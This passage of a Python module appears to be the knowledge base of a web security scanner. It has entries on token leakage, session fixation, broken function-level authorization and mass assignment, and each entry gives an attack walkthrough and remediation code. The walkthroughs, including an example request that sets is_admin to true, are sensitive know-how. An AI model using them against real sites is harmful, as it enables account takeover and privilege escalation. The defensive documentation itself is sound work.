            "# BAD: tokens in URLs\n"
            "/reset?token=abcd1234\n"
            "/api/export?api_key=xyz\n\n"
            "# GOOD: tokens in POST bodies or Authorization header\n"
            "POST /reset  body: token=abcd1234\n"
            "GET /api/export  Authorization: Bearer xyz"
        ),
        "express": (
            "// BAD:\n"
            "app.get('/reset', (req, res) => {\n"
            "  const token = req.query.token;\n"
            "  // ...\n"
            "});\n\n"
            "// GOOD: token in POST body or Authorization header:\n"
            "app.post('/reset', express.json(), (req, res) => {\n"
            "  const token = req.body.token;\n"
            "  // ...\n"
            "});"
        ),
        "flask": (
            "# BAD:\n"
            "@app.route('/reset')\n"
            "def reset():\n"
            "    token = request.args.get('token')\n"
            "    # ...\n\n"
            "# GOOD:\n"
            "@app.route('/reset', methods=['POST'])\n"
            "def reset():\n"
            "    token = request.form.get('token')\n"
            "    # ...\n\n"
            "# Also set Referrer-Policy:\n"
            "@app.after_request\n"
            "def rp(resp):\n"
            "    resp.headers['Referrer-Policy'] = 'no-referrer'\n"
            "    return resp"
        ),
        "nginx": (
            "# Strip Referer on outbound links (defense in depth):\n"
            "add_header Referrer-Policy \"no-referrer\" always;\n\n"
            "# Or in proxy_set_header for upstream logging — never log "
            "the query string:"
        ),
    },
}

SESSION_FIXATION_INDICATOR: VulnEntry = {
    "summary": (
        "The login page accepts a session cookie that was set before "
        "authentication without rotating it. This is an indicator of "
        "session fixation: an attacker can plant a known session ID in "
        "the victim's browser, wait for the victim to log in, then use "
        "the same session ID to access the authenticated session."
    ),
    "technical": (
        "Session fixation works when a web application does not issue a "
        "new session identifier upon authentication (or any other "
        "privilege change). The attacker visits the target, receives a "
        "session cookie with value X, plants cookie X in the victim's "
        "browser via a fixated-cookie attack or a phishing link, waits "
        "for the victim to log in, then uses cookie X — which is now "
        "authenticated as the victim. Robust frameworks (Express, "
        "Django, Spring Security) call `regenerate_session()` or "
        "equivalent on login. Custom auth code frequently misses this "
        "step."
    ),
    "attack_scenario": (
        "1. Attacker visits https://target.example, receives "
        "`Set-Cookie: SESSION=ATTACKERTOKEN`\n"
        "2. Attacker tricks victim into using SESSION=ATTACKERTOKEN "
        "(XSS cookie injection, fixated subdomain, or session-riding "
        "via crafted link)\n"
        "3. Victim logs in. Application does NOT rotate the session "
        "cookie — server now has SESSION=ATTACKERTOKEN mapped to the "
        "victim's authenticated session\n"
        "4. Attacker uses SESSION=ATTACKERTOKEN from their own "
        "browser — authenticated as the victim\n"
        "5. With session rotation in place, the server would have "
        "issued SESSION=NEWTKN and ATTACKERTOKEN would no longer be "
        "valid"
    ),
    "impact": (
        "Account takeover without any credentials. The attacker exploits "
        "the predictable, pre-authenticated session identifier rather "
        "than the login form itself. Detection is hard because the "
        "attacker uses the legitimate authentication flow — the only "
        "telltale is the missing session rotation."
    ),
    "remediation": [
        "Rotate the session identifier on every privilege change — at "
        "minimum, on login and logout. Most frameworks do this with a "
        "single method call (`session.regenerate()` in Express, "
        "`request.session.cycle_key()` in Django).",
        "Invalidate the old session identifier server-side. Rotation is "
        "not enough if the old identifier remains valid in the session "
        "store.",
        "Bind the session to client fingerprints (User-Agent, IP range) "
        "for additional defense in depth — this makes fixated-session "
        "attacks harder to execute.",
        "Audit custom auth code for the absence of session rotation. "
        "Hand-rolled auth is the most common source of this bug.",
    ],
    "code_examples": {
        "express": (
            "// On successful login, regenerate the session:\n"
            "req.session.regenerate((err) => {\n"
            "  if (err) return next(err);\n"
            "  req.session.userId = user.id;\n"
            "  res.redirect('/dashboard');\n"
            "});\n\n"
            "// NEVER leave the pre-login session intact."
        ),
        "flask": (
            "# Flask-Login: call logout_user() before login_user():\n"
            "if user and check_password_hash(user.pw_hash, password):\n"
            "    logout_user()              # clear the old session\n"
            "    login_user(user)           # issue a new session\n"
            "    return redirect(url_for('dashboard'))\n\n"
            "# Or use flask.session.clear() then re-populate."
        ),
        "django": (
            "# Django rotates session keys on login when you call "
            "login() — but if you have a custom auth view, ensure "
            "the session is cycled:\n"
            "from django.contrib.auth import login, logout\n"
            "if user is not None and user.check_password(password):\n"
            "    # Clear the pre-auth session to prevent fixation:\n"
            "    request.session.cycle_key()\n"
            "    login(request, user)"
        ),
        "java_spring": (
            "// Spring Security: configure session-fixation protection:\n"
            "http.sessionManagement()\n"
            "    .sessionFixation()\n"
            "    .newSession()        // creates a fresh session on login\n"
            "    .and()\n"
            "    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED);"
        ),
    },
}

# ---------------------------------------------------------------------------
# Phase 5 entries
# ---------------------------------------------------------------------------

BFLA_FUNCTION_LEVEL: VulnEntry = {
    "summary": (
        "An admin-only endpoint is accessible to non-admin users. The "
        "server returns privileged data (user lists, configuration, "
        "internal state) without checking the requester's role. This "
        "enables privilege escalation: a regular user can read admin "
        "data or, with mutations, perform admin actions."
    ),
    "technical": (
        "Broken Function Level Authorization (BFLA) is the #5 "
        "vulnerability in the OWASP API Security Top 10. It occurs when "
        "the server distinguishes between admin and non-admin endpoints "
        "by URL pattern (e.g. /admin/*) but does not check the requester's "
        "role on each request. A non-admin user who guesses or enumerates "
        "the admin URL can access the endpoint. The fix is role-based "
        "authorization middleware that runs on every request."
    ),
    "attack_scenario": (
        "1. Attacker registers a normal user account on the target\n"
        "2. Attacker guesses admin URLs by trying common patterns: /admin, "
        "/api/admin/users, /api/v1/users, /internal\n"
        "3. Server returns 200 with admin-shaped content (user list, "
        "config, audit logs)\n"
        "4. Attacker downloads the user database, escalates by finding "
        "admin credentials, or modifies system configuration\n"
        "5. Full administrative takeover of the platform"
    ),
    "impact": (
        "Privilege escalation: regular user gains admin capabilities. "
        "Mass data exposure: all user records, payment data, internal "
        "configurations. System compromise: admin actions on the platform "
        "(user suspension, billing changes, security policy changes)."
    ),
    "remediation": [
        "Implement role-based access control (RBAC) middleware that runs "
        "on EVERY endpoint. Do not rely on URL patterns to enforce admin "
        "only.",
        "Use a centralized authorization layer: every controller checks "
        "the requester's role before processing the request.",
        "For multi-tenant systems: every endpoint verifies both role AND "
        "tenant ownership.",
        "Log all admin endpoint access for audit.",
    ],
    "code_examples": {
        "python-flask": (
            "from functools import wraps\n"
            "from flask import abort\n"
            "def admin_required(f):\n"
            "    @wraps(f)\n"
            "    def decorated(*args, **kwargs):\n"
            "        if not current_user.is_authenticated or not current_user.is_admin:\n"
            "            abort(403)\n"
            "        return f(*args, **kwargs)\n"
            "    return decorated\n"
            "@app.route('/admin/users')\n"
            "@login_required\n"
            "@admin_required\n"
            "def list_users(): ..."
        ),
        "node-express": (
            "function requireRole(role) {\n"
            "  return (req, res, next) => {\n"
            "    if (!req.user || req.user.role !== role) {\n"
            "      return res.status(403).end();\n"
            "    }\n"
            "    next();\n"
            "  };\n"
            "}\n"
            "app.get('/admin/users', requireAuth, requireRole('admin'), listUsers);"
        ),
        "java-spring": (
            "@GetMapping(\"/admin/users\")\n"
            "@PreAuthorize(\"hasRole('ADMIN')\")\n"
            "public List<User> listUsers() { ... }"
        ),
        "django": (
            "from django.contrib.auth.decorators import user_passes_test\n"
            "@user_passes_test(lambda u: u.is_authenticated and u.is_staff)\n"
            "def list_users(request): ..."
        ),
    },
}


MASS_ASSIGNMENT_EXPOSURE: VulnEntry = {
    "summary": (
        "The API response exposes sensitive fields (admin flags, role, "
        "balance, verification status) that should not be user-readable. "
        "If the same fields are accepted on PUT/PATCH/POST endpoints, "
        "this becomes a mass-assignment vulnerability: the attacker can "
        "modify them by including them in the request body."
    ),
    "technical": (
        "Mass assignment (a.k.a. auto-binding) vulnerabilities occur when "
        "the server binds the entire request body to a model object "
        "without filtering. The classic example: a /api/profile update "
        "endpoint accepts `{name, email, is_admin}` and the server "
        "binds all three to the User model — the attacker sets is_admin "
        "to true and gets admin access. The fix is explicit allowlisting: "
        "list exactly which fields the user can modify, ignore everything "
        "else. Some frameworks offer a `fields` parameter on serializers "
        "for this purpose. redveil detects this vulnerability passively "
        "by inspecting GET responses for sensitive field names that "
        "should not be exposed to the user — a strong indicator of "
        "potential mass assignment on the corresponding write endpoints."
    ),
    "attack_scenario": (
        "1. Attacker authenticates as themselves\n"
        "2. Attacker requests /api/profile/me — response includes "
        "is_admin, role, balance, internal_id\n"
        "3. Attacker deduces the server binds request bodies to a model\n"
        "4. Attacker sends PUT /api/profile with `{\"name\": \"x\", "
        "\"is_admin\": true}`\n"
        "5. Server updates the user's is_admin field — privilege escalation\n"
        "6. Attacker now has admin access"
    ),
    "impact": (
        "Privilege escalation via role/admin flag modification. Financial "
        "fraud via balance/credit_limit modification. Bypass verification "
        "via email_verified/phone_verified/kyc_status modification. Tenant "
        "leakage via tenant_id modification. Account takeover if the "
        "attacker can change security settings (2FA, recovery email)."
    ),
    "remediation": [
        "Use an explicit allowlist of fields the user can modify. Reject "
        "any field not on the list.",
        "For frameworks that auto-bind (Rails strong_params, Django "
        "ModelForm, Pydantic BaseModel): use the framework's field "
        "filtering feature.",
        "Separate read and write DTOs: the user can READ more fields than "
        "they can WRITE.",
        "Add a 'fillable' / 'writable' / 'editable' attribute on model "
        "fields and check it in the controller.",
    ],
    "code_examples": {
        "python-pydantic": (
            "from pydantic import BaseModel\n"
            "class UserUpdate(BaseModel):\n"
            "    name: str | None = None\n"
            "    email: str | None = None\n"
            "    # is_admin, role, balance are NOT in this model\n"
            "    # so they cannot be set via this endpoint\n"
            "    model_config = ConfigDict(extra='forbid')  # reject unknown fields"
        ),
        "rails-strong-params": (
            "def update\n"
            "  user_params = params.require(:user).permit(:name, :email)\n"
            "  # NOT permitted: :is_admin, :role, :balance\n"
            "  @user.update(user_params)\n"
            "end"
        ),
        "node-express-validator": (
            "const { body } = require('express-validator');\n"
            "app.put('/api/profile',\n"
            "  body('name').optional().isString(),\n"
            "  body('email').optional().isEmail(),\n"
            "  // is_admin, role, balance are NOT in the validation chain\n"
            "  // they will be ignored even if present in the request\n"
            "  updateProfile\n"
            ");"
        ),
        "django-rest-framework": (
            "class UserSerializer(serializers.ModelSerializer):\n"
            "    class Meta:\n"
            "        model = User\n"
            "        fields = ['name', 'email']  # explicit allowlist\n"
            "        # NOT in fields: is_admin, role, balance"
        ),
    },
}


# ---------------------------------------------------------------------------
# Master registry
# ---------------------------------------------------------------------------

VULN_DB: dict[tuple[str, str], VulnEntry] = {
    # security-headers
    ("security-headers", "missing"): MISSING_X_FRAME_OPTIONS,  # generic fallback
    ("security-headers", "x-frame-options-missing"): MISSING_X_FRAME_OPTIONS,
    ("security-headers", "content-security-policy-missing"): MISSING_CSP,
    ("security-headers", "strict-transport-security-missing"): MISSING_HSTS,
    ("security-headers", "x-content-type-options-missing"): MISSING_X_CONTENT_TYPE_OPTIONS,
    ("security-headers", "referrer-policy-missing"): UNSAFE_REFERRER_POLICY,
    ("security-headers", "permissions-policy-missing"): MISSING_PERMISSIONS_POLICY,
    ("security-headers", "improper"): IMPROPER_X_FRAME_OPTIONS,
    ("security-headers", "x-frame-options-improper"): IMPROPER_X_FRAME_OPTIONS,
    ("security-headers", "wildcard"): WILDCARD_CSP,
    ("security-headers", "content-security-policy-wildcard"): WILDCARD_CSP,
    ("security-headers", "short_max_age"): SHORT_HSTS,
    ("security-headers", "strict-transport-security-short-max-age"): SHORT_HSTS,
    ("security-headers", "unsafe"): UNSAFE_REFERRER_POLICY,
    ("security-headers", "referrer-policy-unsafe"): UNSAFE_REFERRER_POLICY,

    # cors-policy
    ("cors-policy", "wildcard_origin"): CORS_WILDCARD,
    ("cors-policy", "reflected_origin"): CORS_REFLECTED,
    ("cors-policy", "wildcard_with_credentials"): CORS_WILDCARD_WITH_CREDENTIALS,

    # information-disclosure
    ("information-disclosure", "version_banner"): DISCLOSURE_VERSION_BANNER,
    ("information-disclosure", "info_header"): DISCLOSURE_VERSION_BANNER,
    ("information-disclosure", "stack_trace"): DISCLOSURE_STACK_TRACE,
    ("information-disclosure", "db_error"): DISCLOSURE_DB_ERROR,
    ("information-disclosure", "html_comment"): DISCLOSURE_HTML_COMMENT,
    ("information-disclosure", "exposed_env"): DISCLOSURE_EXPOSED_ENV,
    ("information-disclosure", "exposed_debug"): DISCLOSURE_EXPOSED_DEBUG,
    ("information-disclosure", "exposed_debug_api"): DISCLOSURE_EXPOSED_DEBUG,
    ("information-disclosure", "exposed_panel"): DISCLOSURE_EXPOSED_PANEL,
    ("information-disclosure", "exposed_phpinfo"): DISCLOSURE_EXPOSED_PANEL,
    ("information-disclosure", "exposed_vcs"): DISCLOSURE_EXPOSED_VCS,
    ("information-disclosure", "exposed_config"): DISCLOSURE_EXPOSED_CONFIG,
    ("information-disclosure", "exposed_api_docs"): DISCLOSURE_EXPOSED_CONFIG,
    ("information-disclosure", "backup_file"): DISCLOSURE_BACKUP_FILE,
    ("information-disclosure", "exposed_source_map"): SOURCE_MAP_EXPOSED,

    # http-methods
    ("http-methods", "trace_enabled"): METHODS_TRACE_ENABLED,
    ("http-methods", "method_allowed_without_auth"): METHODS_PUT_NO_AUTH,
    ("http-methods", "put_no_auth"): METHODS_PUT_NO_AUTH,
    ("http-methods", "delete_no_auth"): METHODS_DELETE_NO_AUTH,
    ("http-methods", "patch_no_auth"): METHODS_PUT_NO_AUTH,
    ("http-methods", "connect_enabled"): METHODS_CONNECT_ENABLED,
    ("http-methods", "method_advertised_in_allow"): METHODS_ADVERTISED,

    # open-redirect-indicator
    ("open-redirect-indicator", "redirect_param"): OPEN_REDIRECT_PARAM,
    ("open-redirect-indicator", "redirect_param_confirmed"): OPEN_REDIRECT_PARAM,

    # source-map-exposure
    ("source-map-exposure", "exposed_source_map"): SOURCE_MAP_EXPOSED,
    ("source-map-exposure", "inline_source_map_ref"): INLINE_SOURCE_MAP_REF,

    # ssrf
    ("ssrf", "ssrf"): SSRF_OOB_CALLBACK,
    ("ssrf", "redirect"): SSRF_OOB_CALLBACK,
    ("ssrf", "body_reference"): SSRF_OOB_CALLBACK,
    ("ssrf", "successful_fetch"): SSRF_OOB_CALLBACK,

    # session-cookie
    ("session-cookie", "cookie_httponly_missing"): COOKIE_HTTPONLY_MISSING,
    ("session-cookie", "cookie_secure_missing"): COOKIE_SECURE_MISSING,
    ("session-cookie", "cookie_samesite_missing"): COOKIE_SAMESITE_MISSING,
    ("session-cookie", "weak_session_token"): WEAK_SESSION_TOKEN,
    ("session-cookie", "token_in_url"): TOKEN_LEAKAGE,
    ("session-cookie", "session_fixation_indicator"): SESSION_FIXATION_INDICATOR,

    # bola-idor
    ("bola-idor", "bola"): BOLA_IDOR,

    # graphql
    ("graphql", "introspection"): GRAPHQL_INTROSPECTION,
    ("graphql", "type_query_works"): GRAPHQL_INTROSPECTION,

    # bfla
    ("bfla", "function_level"): BFLA_FUNCTION_LEVEL,

    # mass-assignment
    ("mass-assignment", "excessive_exposure"): MASS_ASSIGNMENT_EXPOSURE,
    ("mass-assignment", "sensitive_field_exposed"): MASS_ASSIGNMENT_EXPOSURE,
}


def get_entry(check_id: str, kind: str) -> VulnEntry | None:
    """Look up a rich knowledge-base entry by (check_id, issue_kind).

    Returns ``None`` if no entry exists for that combination; callers
    should fall back to their own template content.
    """
    if not kind:
        return None
    return VULN_DB.get((check_id, kind))


def _all_required_fields() -> list[str]:
    return ["summary", "technical", "attack_scenario", "impact", "remediation", "code_examples"]


def validate_entry(entry: VulnEntry) -> list[str]:
    """Return a list of validation errors (empty if the entry is OK)."""
    errors: list[str] = []
    for field_name in _all_required_fields():
        if field_name not in entry:
            errors.append(f"missing field: {field_name}")
            continue
        value = entry[field_name]
        if field_name == "remediation":
            if not isinstance(value, list) or len(value) < 3:
                errors.append("remediation must be a list with >=3 items")
        elif field_name == "code_examples":
            if not isinstance(value, dict) or len(value) < 2:
                errors.append("code_examples must be a dict with >=2 entries")
        else:
            if not isinstance(value, str) or len(value.split()) < 30:
                errors.append(f"{field_name} must be a string with >=30 words")
    return errors
